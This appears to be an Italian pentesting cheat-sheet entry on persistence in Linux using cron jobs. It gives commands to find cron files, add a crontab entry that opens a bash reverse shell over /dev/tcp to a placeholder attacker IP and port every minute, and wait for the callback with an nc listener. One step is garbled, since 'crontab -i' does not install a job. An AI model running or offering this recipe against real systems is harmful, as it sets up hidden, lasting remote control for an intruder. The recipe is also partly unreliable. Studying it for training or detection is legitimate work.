
# Persistenza su Linux tramite CronJobs
un cronjob é un modo per poter automatizzare delle task dentro un sistema linux ed é possibile impostare un tempo che varia da un minuto fino ad arrivare ad un mese di attesa prima che quel comando venga eseguito. <br> 
Possiamo impostare un cronjob in modo che possa effettuare una richiesta di connessione verso la nostra macchina attaccante ogni minuto, ogni ora o ogni giorno, <br> 
Cerchiamo dei file che contengono dei cronjobs per poterli modificare a nostro vantaggio:
```bash
cat /etc/cron*
```
dopo aver identificato un file, per esempio un file `/etc/crontab`, inseriamo un comando che effettuerà una connessione verso il nostro indirizzo ip ogni minuto 
```bash
echo "* * * * * /bin/bash -c 'bash -i >& /dev/tcp/<IP>/<PORT> 0>&1'" > cron
cat cron                                                                                    # per confermare la creazione
crontab -i cron                                                                             # creiamo un cronjob usando il documento cron
crontab -l                                                                                  # mostra tutti i cronjobs presenti
```
adesso, quando vliamo connetterci al target, basta avviare un listener con `nc -nvlp 1234` per poter ricevere la connessione dopo un minuto di attesa. 
